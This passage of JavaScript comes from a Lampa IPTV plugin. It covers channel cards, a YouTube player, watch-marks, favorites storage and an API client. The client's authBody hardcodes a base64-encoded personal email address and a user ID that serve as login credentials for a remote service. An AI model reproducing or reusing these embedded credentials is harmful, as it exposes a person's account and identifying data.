  												Lampa.Noty.show('Неверный пароль.');
  												Lampa.Controller.toggle('content');
  											}
  										});
  									} else goto();
  								} else if (element.description && element.description.indexOf('доступа') > -1) {
  									ForkTV.checkAdd('content');
  								}
  							}
  						}).on('hover:long', function () {
  							if (stream && stream.match('bonga|chatur|rgfoot') == null && stream.match(/stream\\?|mp4|mkv|m3u8/i)) {
  								_this3.contextmenu({
  									item: card,
  									view: view,
  									viewed: viewed,
  									hash_file: hash_file,
  									file: stream
  								});
  							}
  							if ((element.template || element.description) && stream && stream.match('torrstream|getstream|mp4|kinomix') == null && stream.match(/viewtube|details|season|view\\?|voice|magnet|stream\\?id|mp4|m3u8/i) && (element.description || element.template)) {
  								Lampa.Modal.open({
  									title: element.title,
  									size: 'medium',
  									html: $(element.description ? $(element.description).attr('style', '') : element.template),
  									onBack: function onBack() {
  										Lampa.Modal.close();
  										Lampa.Controller.toggle('content');
  									}
  								});
  							}
  						});
  						body.append(card);
  						items.push(card);
  					}
  				});
  			}
  		}
  	};
  	this.build = function (data) {
  		if (data && data.channels && data.channels.length) {
  			scroll.minus();
  			html.append(scroll.render());
  			this.append(data);
  			scroll.append(body);
  			this.activity.toggle();
  		} else {
  			this.activity.toggle();
  			html.append(scroll.render());
  			this.empty();
  		}
  		this.activity.loader(false);
  	};
  	this.createHdGO = function (data) {
  		var content = Lampa.Template.get('items_line', {
  			title: data.title
  		});
  		var body = content.find('.items-line__body');
  		var scroll = new Lampa.Scroll({
  			horizontal: true,
  			step: 300
  		});
  		var items = [];
  		var active = 0;
  		var last;
  		this.create = function () {
  			scroll.render().find('.scroll__body').addClass('items-cards');
  			content.find('.items-line__title').text(data.title);
  			data.results.forEach(this.append.bind(this));
  			body.append(scroll.render());
  		};
  		this.item = function (data) {
  			var item = Lampa.Template.get('hdgo_item', {
  				title: data.title
  			});
  			if (/iPhone|x11|nt|Mozilla/i.test(navigator.userAgent) || Lampa.Platform.tv()) item.addClass('card--collection').find('.card__age').remove();
  			if (/iPhone|x11|nt/i.test(navigator.userAgent) && !Lampa.Platform.is('android')) item.addClass('hdgo pc');
  			if (Lampa.Platform.tv()) item.addClass('hdgo tv');
  			var logo = data.logo_30x30 ? data.logo_30x30 : data.template && data.template.indexOf('src') > -1 ? $('img', data.template).attr('src') : 'img/actor.svg';
  			var img = item.find('img')[0];
  			img.onerror = function () {
  				img.src = './img/img_broken.svg';
  			};
  			img.src = logo;
  			this.render = function () {
  				return item;
  			};
  			this.destroy = function () {
  				img.onerror = function () {};
  				img.onload = function () {};
  				img.src = '';
  				item.remove();
  			};
  		};
  		this.append = function (element) {
  			var _this = this;
  			var item$1 = new _this.item(element);
  			item$1.render().on('hover:focus hover:touch', function () {
  				scroll.render().find('.last--focus').removeClass('last--focus');
  		    item$1.render().addClass('last--focus');

  				last = item$1.render()[0];
  				active = items.indexOf(item$1);
  				scroll.update(items[active].render(), true);
  			}).on('hover:enter', function () {
  				if (element.search_on) {
  					Lampa.Input.edit({
  						value: '',
  						free: true
  					}, function (new_value) {
  						var query = new_value;
  						var u = element.playlist_url && element.playlist_url.indexOf('?') > -1 ? '&' : '/?';
  						network["native"](element.playlist_url + u + 'search=' + query + '&' + ForkTV.user_dev(), function (json) {
  							if (json.channels[0].title.indexOf('Нет результатов') == -1) {
  								Lampa.Activity.push({
  									title: element.title,
  									url: json,
  									submenu: true,
  									component: 'forktv',
  									page: 1
  								});
  							} else {
  								Lampa.Modal.open({
  									title: '',
  									size: 'medium',
  									html: Lampa.Template.get('error', {
  										title: 'Ошибка',
  										text: json.channels[0].title
  									}),
  									onBack: function onBack() {
  										Lampa.Modal.close();
  										Lampa.Controller.toggle('content');
  									}
  								});
  							}
  						});
  					});
  				} else {
  					Lampa.Activity.push({
  						title: element.title,
  						url: element.playlist_url,
  						submenu: false,
  						component: 'forktv',
  						page: 1
  					});
  				}
  			});
  			scroll.append(item$1.render());
  			items.push(item$1);
  		};
  		this.toggle = function () {
  			var _this = this;
  			Lampa.Controller.add('hdgo_line', {
  				toggle: function toggle() {
  					Lampa.Controller.collectionSet(scroll.render());
  					Lampa.Controller.collectionFocus(last || false, scroll.render());
  				},
  				right: function right() {
  					Navigator.move('right');
  					Lampa.Controller.enable('hdgo_line');
  				},
  				left: function left() {
  					if (Navigator.canmove('left')) Navigator.move('left');
  					else if (_this.onLeft) _this.onLeft();
  					else Lampa.Controller.toggle('menu');
  				},
  				down: this.onDown,
  				up: this.onUp,
  				gone: function gone() {},
  				back: this.onBack
  			});
  			Lampa.Controller.toggle('hdgo_line');
  		};
  		this.render = function () {
  			return content;
  		};
  		this.destroy = function () {
  			Lampa.Arrays.destroy(items);
  			scroll.destroy();
  			content.remove();
  			items = null;
  		};
  	};
  	this.appendHdgo = function (data) {
  		var _this = this;
  		var item = new _this.createHdGO(data);
  		item.create();
  		item.onDown = this.down.bind(this);
  		item.onUp = this.up.bind(this);
  		item.onBack = this.back.bind(this);
  		scroll.append(item.render());
  		items.push(item);
  	};
  	this.YouTube = function (id) {
  		var player, html$7, timer$1;
  
  		function create$f(id) {
  			html$7 = $('<div class="youtube-player"><div id="youtube-player"></div><div id="youtube-player__progress" class="youtube-player__progress"></div></div>');
  			$('body').append(html$7);
  			player = new YT.Player('youtube-player', {
  				height: window.innerHeight,
  				width: window.innerWidth,
  				playerVars: {
  					'controls': 0,
  					'showinfo': 0,
  					'autohide': 1,
  					'modestbranding': 1,
  					'autoplay': 1
  				},
  				videoId: id,
  				events: {
  					onReady: function onReady(event) {
  						event.target.playVideo();
  						update$2();
  					},
  					onStateChange: function onStateChange(state) {
  						if (state.data == 0) {
  							Lampa.Controller.toggle('content');
  						}
  					}
  				}
  			});
  		}
  
  		function update$2() {
  			timer$1 = setTimeout(function () {
  				var progress = player.getCurrentTime() / player.getDuration() * 100;
  				$('#youtube-player__progress').css('width', progress + '%');
  				update$2();
  			}, 400);
  		}
  
  		function play(id) {
  			create$f(id);
  			Lampa.Controller.add('youtube', {
  				invisible: true,
  				toggle: function toggle() {},
  				right: function right() {
  					player.seekTo(player.getCurrentTime() + 10, true);
  				},
  				left: function left() {
  					player.seekTo(player.getCurrentTime() - 10, true);
  				},
  				enter: function enter() {},
  				gone: function gone() {
  					destroy$2();
  				},
  				back: function back() {
  					Lampa.Controller.toggle('content');
  				}
  			});
  			Lampa.Controller.toggle('youtube');
  		}
  
  		function destroy$2() {
  			clearTimeout(timer$1);
  			player.destroy();
  			html$7.remove();
  			html$7 = null;
  		}
  		play(id);
  	};
  	this.contextmenu = function (params) {
  		var _this = this;
  		contextmenu_all.push(params);
  		var enabled = Lampa.Controller.enabled().name;
  		var menu = [{
  			title: Lampa.Lang.translate('torrent_parser_label_title'),
  			mark: true
  			}, {
  			title: Lampa.Lang.translate('torrent_parser_label_cancel_title'),
  			clearmark: true
  			}, {
  			title: Lampa.Lang.translate('online_title_clear_all_mark'),
  			clearmark_all: true
  			}, {
  			title: Lampa.Lang.translate('time_reset'),
  			timeclear: true
  			}, {
  			title: Lampa.Lang.translate('online_title_clear_all_timecode'),
  			timeclear_all: true
  			}, {
  			title: Lampa.Lang.translate('copy_link'),
  			copylink: true
  			}];
  		if (Lampa.Platform.is('webos')) {
  			menu.push({
  				title: Lampa.Lang.translate('player_lauch') + ' - Webos',
  				player: 'webos'
  			});
  		}
  		if (Lampa.Platform.is('android')) {
  			menu.push({
  				title: Lampa.Lang.translate('player_lauch') + ' - Android',
  				player: 'android'
  			});
  		}
  		menu.push({
  			title: Lampa.Lang.translate('player_lauch') + ' - Lampa',
  			player: 'lampa'
  		});
  		Lampa.Select.show({
  			title: Lampa.Lang.translate('title_action'),
  			items: menu,
  			onBack: function onBack() {
  				Lampa.Controller.toggle(enabled);
  			},
  			onSelect: function onSelect(a) {
  				if (a.clearmark) {
  					Lampa.Arrays.remove(params.viewed, params.hash_file);
  					Lampa.Storage.set('online_view', params.viewed);
  					params.item.find('.torrent-item__viewed').remove();
  				}
  				if (a.clearmark_all) {
  					contextmenu_all.forEach(function (params) {
  						Lampa.Arrays.remove(params.viewed, params.hash_file);
  						Lampa.Storage.set('online_view', params.viewed);
  						params.item.find('.torrent-item__viewed').remove();
  					});
  				}
  				if (a.mark) {
  					if (params.viewed.indexOf(params.hash_file) == -1) {
  						params.viewed.push(params.hash_file);
  						params.item.append('<div class="torrent-item__viewed">' + Lampa.Template.get('icon_star', {}, true) + '</div>');
  						Lampa.Storage.set('online_view', params.viewed);
  					}
  				}
  				if (a.timeclear) {
  					params.view.percent = 0;
  					params.view.time = 0;
  					params.view.duration = 0;
  					Lampa.Timeline.update(params.view);
  					Lampa.Arrays.remove(params.viewed, params.hash_file);
  					params.item.find('.torrent-item__viewed').remove();
  					Lampa.Storage.set('online_view', params.viewed);
  				}
  				if (a.timeclear_all) {
  					contextmenu_all.forEach(function (params) {
  						params.view.percent = 0;
  						params.view.time = 0;
  						params.view.duration = 0;
  						Lampa.Timeline.update(params.view);
  						Lampa.Arrays.remove(params.viewed, params.hash_file);
  						params.item.find('.torrent-item__viewed').remove();
  						Lampa.Storage.set('online_view', params.viewed);
  					});
  				}
  				Lampa.Controller.toggle(enabled);
  				if (a.player) {
  					Lampa.Player.runas(a.player);
  					params.item.trigger('hover:enter');
  				}
  				if (a.copylink) {
  					Lampa.Utils.copyTextToClipboard(params.file, function () {
  						Lampa.Noty.show(Lampa.Lang.translate('copy_secuses'));
  					}, function () {
  						Lampa.Noty.show(Lampa.Lang.translate('copy_error'));
  					});
  				}
  			}
  		});
  	};
  	this.empty = function () {
  		var empty = new Lampa.Empty();
  		scroll.append(empty.render());
  		this.start = empty.start;
  		this.activity.loader(false);
  		this.activity.toggle();
  	};
  	this.start = function () {
  		Lampa.Controller.add('content', {
  			toggle: function toggle() {
  				if (object.title == 'HDGO' && items.length) {
  					items[active].toggle();
  				} else {
  					Lampa.Controller.collectionSet(scroll.render(), html);
  					Lampa.Controller.collectionFocus(last || false, scroll.render());
  				}
  			},
  			left: function left() {
  				if (Navigator.canmove('left')) {
  					Navigator.move('left');
  				} else Lampa.Controller.toggle('menu');
  			},
  			right: function right() {
  				Navigator.move('right');
  			},
  			up: function up() {
  				if (Navigator.canmove('up')) Navigator.move('up');
  				else Lampa.Controller.toggle('head');
  			},
  			down: function down() {
  				if (Navigator.canmove('down')) Navigator.move('down');
  			},
  			back: this.back
  		});
  		Lampa.Controller.toggle('content');
  	};
  	this.down = function () {
  		active++;
  		active = Math.min(active, items.length - 1);
  		items[active].toggle();
  		scroll.update(items[active].render());
  	};
  	this.up = function () {
  		active--;
  		if (active < 0) {
  			active = 0;
  			Lampa.Controller.toggle('head');
  		} else {
  			items[active].toggle();
  		}
  		scroll.update(items[active].render());
  	};
  	this.back = function () {
  		Lampa.Activity.backward();
  	};
  	this.pause = function () {};
  	this.stop = function () {};
  	this.render = function () {
  		return html;
  	};
  	this.destroy = function () {
  		network.clear();
  		scroll.destroy();
  		html.remove();
  		body.remove();
  		network = null;
  		items = null;
  		html = null;
  		body = null;
  	};
  }
	function _classCallCheck(a, n) {
    if (!(a instanceof n)) throw new TypeError("Cannot call a class as a function");
  }
  function _defineProperties(e, r) {
    for (var t = 0; t < r.length; t++) {
      var o = r[t];
      o.enumerable = o.enumerable || !1, o.configurable = !0, "value" in o && (o.writable = !0), Object.defineProperty(e, _toPropertyKey(o.key), o);
    }
  }
  function _createClass(e, r, t) {
    return r && _defineProperties(e.prototype, r), t && _defineProperties(e, t), Object.defineProperty(e, "prototype", {
      writable: !1
    }), e;
  }
  function _defineProperty(e, r, t) {
    return (r = _toPropertyKey(r)) in e ? Object.defineProperty(e, r, {
      value: t,
      enumerable: !0,
      configurable: !0,
      writable: !0
    }) : e[r] = t, e;
  }
  function ownKeys(e, r) {
    var t = Object.keys(e);
    if (Object.getOwnPropertySymbols) {
      var o = Object.getOwnPropertySymbols(e);
      r && (o = o.filter(function (r) {
        return Object.getOwnPropertyDescriptor(e, r).enumerable;
      })), t.push.apply(t, o);
    }
    return t;
  }
  function _objectSpread2(e) {
    for (var r = 1; r < arguments.length; r++) {
      var t = null != arguments[r] ? arguments[r] : {};
      r % 2 ? ownKeys(Object(t), !0).forEach(function (r) {
        _defineProperty(e, r, t[r]);
      }) : Object.getOwnPropertyDescriptors ? Object.defineProperties(e, Object.getOwnPropertyDescriptors(t)) : ownKeys(Object(t)).forEach(function (r) {
        Object.defineProperty(e, r, Object.getOwnPropertyDescriptor(t, r));
      });
    }
    return e;
  }
  function _toPrimitive(t, r) {
    if ("object" != typeof t || !t) return t;
    var e = t[Symbol.toPrimitive];
    if (void 0 !== e) {
      var i = e.call(t, r || "default");
      if ("object" != typeof i) return i;
      throw new TypeError("@@toPrimitive must return a primitive value.");
    }
    return ("string" === r ? String : Number)(t);
  }
  function _toPropertyKey(t) {
    var i = _toPrimitive(t, "string");
    return "symbol" == typeof i ? i : i + "";
  }

  var Utils = /*#__PURE__*/function () {
    function Utils() {
      _classCallCheck(this, Utils);
    }
    return _createClass(Utils, null, [{
      key: "clear",
      value: function clear(str) {
        return str.replace(/\&quot;/g, '"').replace(/\&#039;/g, "'").replace(/\&amp;/g, "&").replace(/\&.+?;/g, '');
      }
    }, {
      key: "isHD",
      value: function isHD(name) {
        var math = name.toLowerCase().match(' .hd$| .нd$| .hd | .нd | hd$| нd&| hd | нd ');
        return math ? math[0].trim() : '';
      }
    }, {
      key: "clearHDSD",
      value: function clearHDSD(name) {
        return name.replace(/ hd$| нd$| .hd$| .нd$/gi, '').replace(/ sd$/gi, '').replace(/ hd | нd | .hd | .нd /gi, ' ').replace(/ sd /gi, ' ');
      }
    }, {
      key: "clearMenuName",
      value: function clearMenuName(name) {
        return name.replace(/^\d+\. /gi, '').replace(/^\d+ /gi, '');
      }
    }, {
      key: "clearChannelName",
      value: function clearChannelName(name) {
        return this.clearHDSD(this.clear(name));
      }
    }, {
      key: "hasArchive",
      value: function hasArchive(channel) {
        if (channel.catchup) {
          var days = parseInt(channel.catchup.days);
          if (!isNaN(days) && days > 0) return days;
        }
        return 0;
      }
    }, {
      key: "canUseDB",
      value: function canUseDB() {
        return DB.db && Lampa.Storage.get('iptv_use_db', 'indexdb') == 'indexdb';
      }
    }]);
  }();

  var favorites = [];
  var TVFavorites = /*#__PURE__*/function () {
    function TVFavorites() {
      _classCallCheck(this, TVFavorites);
    }
    return _createClass(TVFavorites, null, [{
      key: "load",
      value: function load() {
        var _this = this;
        return new Promise(function (resolve, reject) {
          if (Utils.canUseDB()) {
            DB.getData('favorites').then(function (result) {
              favorites = result || [];
            })["finally"](resolve);
          } else {
            _this.nosuport();
            resolve();
          }
        });
      }
    }, {
      key: "nosuport",
      value: function nosuport() {
        favorites = Lampa.Storage.get('iptv_favorite_channels', '[]');
      }
    }, {
      key: "list",
      value: function list() {
        return favorites;
      }
    }, {
      key: "key",
      value: function key() {
        return Lampa.Storage.get('iptv_favotite_save', 'url');
      }
    }, {
      key: "find",
      value: function find(favorite) {
        var _this2 = this;
        return favorites.find(function (a) {
          return a[_this2.key()] == favorite[_this2.key()];
        });
      }
    }, {
      key: "remove",
      value: function remove(favorite) {
        var _this3 = this;
        return new Promise(function (resolve, reject) {
          var find = favorites.find(function (a) {
            return a[_this3.key()] == favorite[_this3.key()];
          });
          if (find) {
            if (Utils.canUseDB()) {
              DB.deleteData('favorites', favorite[_this3.key()]).then(function () {
                Lampa.Arrays.remove(favorites, find);
                resolve();
              })["catch"](reject);
            } else {
              Lampa.Arrays.remove(favorites, find);
              Lampa.Storage.set('iptv_favorite_channels', favorites);
              resolve();
            }
          } else reject();
        });
      }
    }, {
      key: "add",
      value: function add(favorite) {
        var _this4 = this;
        return new Promise(function (resolve, reject) {
          if (!favorites.find(function (a) {
            return a[_this4.key()] == favorite[_this4.key()];
          })) {
            Lampa.Arrays.extend(favorite, {
              view: 0,
              added: Date.now()
            });
            if (Utils.canUseDB()) {
              DB.addData('favorites', favorite[_this4.key()], favorite).then(function () {
                favorites.push(favorite);
                resolve();
              })["catch"](reject);
            } else {
              favorites.push(favorite);
              Lampa.Storage.set('iptv_favorite_channels', favorites);
              resolve();
            }
          } else reject();
        });
      }
    }, {
      key: "update",
      value: function update(favorite) {
        var _this5 = this;
        return new Promise(function (resolve, reject) {
          if (favorites.find(function (a) {
            return a[_this5.key()] == favorite[_this5.key()];
          })) {
            Lampa.Arrays.extend(favorite, {
              view: 0,
              added: Date.now()
            });
            if (Utils.canUseDB()) DB.updateData('favorites', favorite[_this5.key()], favorite).then(resolve)["catch"](reject);else {
              Lampa.Storage.set('iptv_favorite_channels', favorites);
              resolve();
            }
          } else reject();
        });
      }
    }, {
      key: "toggle",
      value: function toggle(favorite) {
        return this.find(favorite) ? this.remove(favorite) : this.add(favorite);
      }
    }]);
  }();

  var locked = [];
  var Locked = /*#__PURE__*/function () {
    function Locked() {
      _classCallCheck(this, Locked);
    }
    return _createClass(Locked, null, [{
      key: "load",
      value: function load() {
        var _this = this;
        return new Promise(function (resolve, reject) {
          if (Utils.canUseDB()) {
            DB.getData('locked').then(function (result) {
              locked = result || [];
            })["finally"](resolve);
          } else {
            _this.nosuport();
            resolve();
          }
        });
      }
    }, {
      key: "nosuport",
      value: function nosuport() {
        locked = Lampa.Storage.get('iptv_locked_channels', '[]');
      }
    }, {
      key: "list",
      value: function list() {
        return locked;
      }
    }, {
      key: "find",
      value: function find(key) {
        return locked.find(function (a) {
          return a == key;
        });
      }
    }, {
      key: "format",
      value: function format(type, element) {
        return type == 'channel' ? 'channel:' + element[Lampa.Storage.get('iptv_favotite_save', 'url')] : type == 'group' ? 'group:' + element : 'other:' + element;
      }
    }, {
      key: "remove",
      value: function remove(key) {
        return new Promise(function (resolve, reject) {
          var find = locked.find(function (a) {
            return a == key;
          });
          if (find) {
            if (Utils.canUseDB()) {
              DB.deleteData('locked', key).then(function () {
                Lampa.Arrays.remove(locked, find);
                resolve();
              })["catch"](reject);
            } else {
              Lampa.Arrays.remove(locked, find);
              Lampa.Storage.set('iptv_locked_channels', locked);
              resolve();
            }
          } else reject();
        });
      }
    }, {
      key: "add",
      value: function add(key) {
        return new Promise(function (resolve, reject) {
          if (!locked.find(function (a) {
            return a == key;
          })) {
            if (Utils.canUseDB()) {
              DB.addData('locked', key, key).then(function () {
                locked.push(key);
                resolve();
              })["catch"](reject);
            } else {
              locked.push(key);
              Lampa.Storage.set('iptv_locked_channels', locked);
              resolve();
            }
          } else reject();
        });
      }
    }, {
      key: "update",
      value: function update(key) {
        return new Promise(function (resolve, reject) {
          if (locked.find(function (a) {
            return a == key;
          })) {
            if (Utils.canUseDB()) DB.updateData('locked', key, key).then(resolve)["catch"](reject);else {
              Lampa.Storage.set('iptv_locked_channels', locked);
              resolve();
            }
          } else reject();
        });
      }
    }, {
      key: "toggle",
      value: function toggle(key) {
        return this.find(key) ? this.remove(key) : this.add(key);
      }
    }]);
  }();

  var DB = new Lampa.DB('modss_iptv', ['playlist', 'params', 'epg', 'favorites', 'other', 'epg_channels', 'locked'], 6);
  DB.logs = true;
  DB.openDatabase().then(function () {
    TVFavorites.load();
    Locked.load();
  })["catch"](function () {
    TVFavorites.nosuport();
    Locked.nosuport();
  });

  function fixParams(params_data) {
    var params = params_data || {};
    Lampa.Arrays.extend(params, {
      update: 'none',
      update_time: Date.now(),
      loading: 'modss'
    });
    return params;
  }

  function iptvParamTitle(key) {
    if (key === 'modss') return 'Modss';
    if (key === 'lampa') return 'Lampa';
    return Lampa.Lang.translate('iptv_params_' + key);
  }

  var Params = /*#__PURE__*/function () {
    function Params() {
      _classCallCheck(this, Params);
    }
    return _createClass(Params, null, [{
      key: "get",
      value: function get(id) {
        return new Promise(function (resolve) {
          if (Utils.canUseDB()) {
            DB.getDataAnyCase('params', id).then(function (params) {
              resolve(fixParams(params));
            });
          } else {
            resolve(fixParams(Lampa.Storage.get('iptv_playlist_params_' + id, '{}')));
          }
        });
      }
    }, {
      key: "set",
      value: function set(id, params) {
        if (Utils.canUseDB()) {
          return DB.rewriteData('params', id, fixParams(params));
        } else {
          return new Promise(function (resolve) {
            Lampa.Storage.set('iptv_playlist_params_' + id, fixParams(params));
            resolve();
          });
        }
      }
    }, {
      key: "value",
      value: function value(params, name) {
        return iptvParamTitle(params[name]);
      }
    }]);
  }();

  var TVApi = /*#__PURE__*/function () {
    function TVApi() {
      _classCallCheck(this, TVApi);
    }
    return _createClass(TVApi, null, [{
      key: "api_url",
      get: function get() {
        return API + 'iptv/';
      }
    }, {
      key: "authBody",
      value: function authBody() {
        return {
          id: 'emFlYmFsbzkxQGdtYWlsLmNvbQ==',
          uid: 'bb04b81f6297b1b6280ea8273_142486046'
        };
      }
    }, {
      key: "post",
      value: function post(method, postData, catch_error) {
        var _this = this;
        return new Promise(function (resolve, reject) {
          var body = _objectSpread2(_objectSpread2({}, _this.authBody()), postData);
          var opts = {};
          _this.network.silent(_this.api_url + method, resolve, catch_error ? reject : resolve, body, opts);
        });
      }
    }, {
      key: "time",
      value: function time(call) {
        this.network.silent(this.api_url + 'time', call, function () {
          return call({
            time: Date.now()
          });
        });
      }
    }, {
      key: "m3u",
      value: function m3u(url) {
        var _this2 = this;
        return new Promise(function (resolve, reject) {
          var auth = _this2.authBody();
          _this2.network.timeout(20000);
          _this2.network["native"](url, function (str) {
            try {
              var file = new File([str], "playlist.m3u", {
                type: "text/plain"
              });
              var formData = new FormData($('<form></form>')[0]);
              formData.append("file", file, "playlist.m3u");
              formData.append("id", auth.id);
              formData.append("uid", auth.uid);
              $.ajax({
                url: _this2.api_url + 'playlist',
                type: 'POST',
                data: formData,
                async: true,
                cache: false,
                contentType: false,
                timeout: 20000,
                enctype: 'multipart/form-data',
                processData: false,
                success: function success(j) {
                  if (j && j.secuses !== false) resolve(j);else reject({
                    responseJSON: j || {},
                    status: 0
                  });
                },
                error: function error(e) {
                  reject(e);
                }
              });
            } catch (e) {
              reject(e);
            }
          }, function (e) {
            reject(e);
          }, false, {
            dataType: 'text'
          });
        });
      }
    }, {
      key: "list",
      value: function list() {
        var _this2 = this;
        return new Promise(function (resolve, reject) {
          _this2.network.silent(_this2.api_url + 'list', function (data) {
            if (data && data.title && data.descr) {
              return reject({ title: data.title, descr: data.descr || '' });
            }
            if (data && data.list) {
              DB.rewriteData('playlist', 'list', data);
              data.list.forEach(function (p) {
                if (p.local) {
                  Params.get(p.id).then(function (params) {
                    if (params.update === 'none') {
                      params.update = 'hour';
                      Params.set(p.id, params);
                    }
                  });
                }
              });
            }
            resolve(data || {
              list: []
            });
          }, function (e) {
            DB.getDataAnyCase('playlist', 'list').then(function (cached) {
              if (cached && cached.list) {
                cached.list.forEach(function (p) {
                  if (p.local) {
                    Params.get(p.id).then(function (params) {
                      if (params.update === 'none') {
                        params.update = 'hour';
                        Params.set(p.id, params);
                      }
                    });
                  }
                });
              }
              return resolve(cached || {
                list: []
              });
            })["catch"](reject);
          }, _objectSpread2({}, _this2.authBody()));
        });
      }
    }, {
      key: "playlist",
      value: function playlist(data) {
        var _this3 = this;
        var id = data.id;
        return new Promise(function (resolve, reject) {
          Promise.all([DB.getDataAnyCase('playlist', id), Params.get(id)]).then(function (result) {
            var playlist = result[0];
            var params = result[1];
            if (data.local && params.update === 'none') {
              params.update = 'hour';
              Params.set(id, params);
            }
            if (playlist && params) {
              var time = {
                'always': 0,
                'hour': 1000 * 60 * 60,
                'hour12': 1000 * 60 * 60 * 12,
                'day': 1000 * 60 * 60 * 24,
                'week': 1000 * 60 * 60 * 24 * 7,
                'none': 0
              };
              if (params.update_time + time[params.update] > Date.now() || params.update == 'none') return resolve(playlist);
            }
            var secuses = function secuses(result) {
              if (result && result.secuses === false) {
                var txt = result.text || result.descr || result.title || result.message || result.error || 'Ошибка';
                var code = result.code != null ? String(result.code) : '';
                return reject({
                  responseJSON: {
                    text: txt,
                    code: code
                  },
                  status: 0
                });
              }
              DB.rewriteData('playlist', id, result)["finally"](function () {
                if (params) params.update_time = Date.now();
                Params.set(id, params)["finally"](resolve.bind(resolve, result));
              });
            };
            var error = function error(e) {
              playlist ? resolve(playlist) : reject(e);
            };
            if (params && params.loading == 'lampa' && !data.local) {
              _this3.m3u(data.url || data.id).then(secuses)["catch"](error);
            } else {
              _this3.post('playlist', {
                url: data.url || data.id
              }, true).then(secuses)["catch"](error);
            }
          })["catch"](function (e) {
            e.from_error = 'Playlist Function (Something went wrong)';
            reject(e);
          });
        });
      }
    }, {
      key: "program",
      value: function program(data) {
        var api = this;
        return new Promise(function (resolve, reject) {
          var days = Lampa.Storage.field('iptv_modss_guide_custom') ? Lampa.Storage.field('iptv_modss_guide_save') : 3;
          var tvg_id = (data.tvg && data.tvg.id ? data.tvg.id : data.channel_id) + '';
          var tvg_name = data.tvg && data.tvg.name ? data.tvg.name : '';
          var channel_id = (data.channel_id || '') + '';
          var loadModss = function loadModss() {
            var id = Lampa.Storage.field('iptv_modss_guide_custom') ? tvg_id : channel_id;
            var auth = api.authBody();
            var q = 'id=' + encodeURIComponent(auth.id) + '&uid=' + encodeURIComponent(auth.uid);
            var url = api.api_url + 'program/' + data.channel_id + '/' + data.time + '?full=true&' + q;
            api.network.timeout(5000);
            api.network.silent(url, function (result) {
              DB.rewriteData('epg', id, result.program)["finally"](resolve.bind(resolve, result.program));
            }, function (a) {
              if (a.status == 500) DB.rewriteData('epg', id, [])["finally"](resolve.bind(resolve, []));else reject();
            }, false);
          };
          var loadEPG = function loadEPG(id, call) {
            if (!id) {
              if (call) call();
              return;
            }
            DB.getDataAnyCase('epg', id, 60 * 24 * days).then(function (epg) {
              if (epg) resolve(epg);else if (call) call();
            });
          };
          var tryNext = function tryNext() {
            var name = (tvg_name || data.name || '').toLowerCase();
            if (!name) return loadModss();
            DB.getDataAnyCase('epg_channels', name).then(function (gu) {
              if (gu) loadEPG((gu.id || '') + '', function () {
                return loadModss();
              });else loadModss();
            });
          };
          if (!channel_id && !tvg_id) {
            reject();
            return;
          }
          // 1) channel_id; 
          // 2) tvg_id; 
          // 3) epg_channels by name; 
          // 4) API
          loadEPG(channel_id, function () {
            return loadEPG(tvg_id !== channel_id ? tvg_id : null, function () {
              return tryNext();
            });
          });
        });
      }
    }]);
  }();
  _defineProperty(TVApi, "network", new Lampa.Reguest());

  var Pilot = /*#__PURE__*/function () {
    function Pilot() {
      _classCallCheck(this, Pilot);
    }
    return _createClass(Pilot, null, [{
      key: "notebook",
      value: function notebook(param_name, param_set) {
        var book = Lampa.Storage.get('iptv_pilot_book', '{}');
        Lampa.Arrays.extend(book, {
          playlist: '',
          channel: -1,
          category: ''
        });
        if (typeof param_set !== 'undefined') {
          book[param_name] = param_set;
          Lampa.Storage.set('iptv_pilot_book', book);
        } else return book[param_name];
      }
    }]);
  }();

  var PlaylistItem = /*#__PURE__*/function () {
    function PlaylistItem(playlist) {
      var _this = this;
      _classCallCheck(this, PlaylistItem);
      this.playlist = playlist;
      this.urlTvg = null;
      this.item = Lampa.Template.js('modss_iptv_playlist_item');
      this.footer = this.item.find('.iptv-playlist-item__footer');
      this.params = {};
      Params.get(playlist.id).then(function (params) {
        _this.params = params;
        _this.drawFooter();
      });
      DB.getDataAnyCase('playlist', playlist.id).then(function (cached) {
        if (cached && cached.urlTvg) {
          _this.urlTvg = cached.urlTvg;
          _this.item.find('.iptv-playlist-item__epg-badge').removeClass('hide');
        }
      });
      var name = playlist.name || '---';
      this.item.find('.iptv-playlist-item__url').text(playlist.url);
      this.item.find('.iptv-playlist-item__name-text').text(name);
      this.item.find('.iptv-playlist-item__name-ico span').text(name.slice(0, 1).toUpperCase());
      this.item.on('hover:long', this.displaySettings.bind(this)).on('hover:enter', function () {
        if (_this.deleted) return;
        Pilot.notebook('playlist', playlist.id);
        DB.rewriteData('playlist', 'active', playlist.id)["finally"](function () {
          _this.listener.send('channels-load', playlist);
        });
      });
      this.item.on('update', function () {
        Params.get(playlist.id).then(function (params) {
          _this.params = params;
          _this.drawFooter();
        });
      });
    }
    return _createClass(PlaylistItem, [{
      key: "displaySettings",
      value: function displaySettings() {
        var _this2 = this;
        if (this.deleted) return;
        var menu = [];
        if (this.urlTvg) {
          menu.push({
            title: Lampa.Lang.translate('iptv_playlist_use_epg'),
            subtitle: Lampa.Lang.translate('iptv_playlist_has_epg'),
            name: 'use_playlist_epg'
          });
        }
        menu.push({
          title: Lampa.Lang.translate('iptv_update'),
          subtitle: Params.value(this.params, 'update'),
          name: 'update'
        });
        if (!this.playlist.local) {
          menu.push({
            title: Lampa.Lang.translate('iptv_loading'),
            subtitle: Params.value(this.params, 'loading'),
            name: 'loading'
          });
        }
        menu.push({
          title: Lampa.Lang.translate('iptv_remove_cache'),
          subtitle: Lampa.Lang.translate('iptv_remove_cache_descr')
        });
        Lampa.Select.show({
          title: Lampa.Lang.translate('title_settings'),
          items: menu,
          onSelect: function onSelect(a) {
            if (a.name === 'use_playlist_epg') {
              if (window.iptv_modss_guide_update_process) {
                Lampa.Noty.show(Lampa.Lang.translate('iptv_guide_status_update_wait'));
                return;
              }
              var modalBody = Lampa.Template.js('modss_playlist_epg_modal');
              var status = modalBody.find('.update-guide-status');
              var parsingBlock = modalBody.find('.playlist-epg-modal__parsing');
              var resultBlock = modalBody.find('.playlist-epg-modal__result');
              var progressFill = modalBody.find('.playlist-epg-modal__progress-fill');
              var percentEl = modalBody.find('.playlist-epg-modal__percent');
              var modalRoot = (modalBody && modalBody[0]) || (modalBody && modalBody.length ? modalBody[0] : modalBody) || modalBody;
              var setCheckpoint = function setCheckpoint(active) {
                var order = ['load', 'parse', 'save', 'complete'];
                var idx = order.indexOf(active);
                if (idx < 0) idx = order.length - 1;
                var list = modalRoot && modalRoot.querySelectorAll ? modalRoot.querySelectorAll('.playlist-epg-modal__checkpoint') : [];
